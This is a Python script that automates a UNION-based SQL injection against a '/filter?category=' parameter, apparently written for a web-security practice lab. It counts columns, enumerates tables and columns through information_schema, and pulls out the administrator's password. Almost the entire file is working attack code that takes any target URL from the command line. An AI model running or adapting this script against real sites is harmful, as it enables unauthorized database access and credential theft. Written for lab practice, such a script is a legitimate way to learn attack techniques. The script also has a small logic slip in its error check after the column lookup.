import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080' }


def get_admin_password(s,url,table,user,password):
    uri = "/filter?category=Gifts'union+select+%s,%s+FROM+%s--" %(user,password,table)
    print(url+uri)
    res = s.get(url+uri, verify=False,proxies=proxies)
    soup = BeautifulSoup(res.text,"html.parser")
    if 'administrator' in res.text:
        print("[+] SQL administrator password found")
        password = soup.find(text="administrator").parent.findNext("td").contents[0]
        print("[+] SQL admin password: %s" %password)
        return True
    else:
        return False


def get_column_names(s,url,table_name):
    uri = "/filter?category=Gifts'union+select+column_name,null+FROM+information_schema.columns+WHERE+table_name='%s'--" %table_name
    res = s.get(url+uri, verify=False,proxies=proxies)
    soup = BeautifulSoup(res.text,"html.parser")
    if "Internal Server Error" not in res.text:
        user_name = soup.find(text=re.compile('.*username.*'))
        pass_name = soup.find(text=re.compile('.*password.*'))
        print("[+] SQL username and password: "+str(user_name)+" "+str(pass_name))
        return user_name,pass_name
    return False


def get_table_names(s,url):
    uri = "/filter?category=Gifts'union+select+table_name,null+from+information_schema.tables--"
    res = s.get(url+uri, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text,"html.parser")
    if "Internal Server Error" not in res.text:
        table_name = soup.find(text=re.compile('.*users.*'))
        print("[+] SQL Table name: "+str(table_name))
        return table_name
    return False


def get_col_num(s,url):
    for i in range(1,50):
        uri = "/filter?category=Gifts'order+by+%s--" %i
        res = s.get(url+uri, verify=False, proxies=proxies)
        if "Internal Server Error" in res.text:
            return i-1
    return False


if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print('[-] Example: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()
    col_num = get_col_num(s,url)

    if col_num:
        print("[+] SQL number of columns: "+str(col_num))
    else:
        print("[-] SQL Injection: column number not found")
        sys.exit(-1)
    
    table = get_table_names(s,url)
    if table:
        print("[+] SQL table name: "+str(table))
    else:
        print("[-] SQL Injection: table name not found")
        sys.exit(-1)

    user,password = get_column_names(s,url,table)
    if table:
        print("[+] SQL name of columns: "+str(user)+" "+str(password))
    else:
        print("[-] SQL Injection: column name not found")
        sys.exit(-1)

    get_admin_password(s,url,table,user,password)
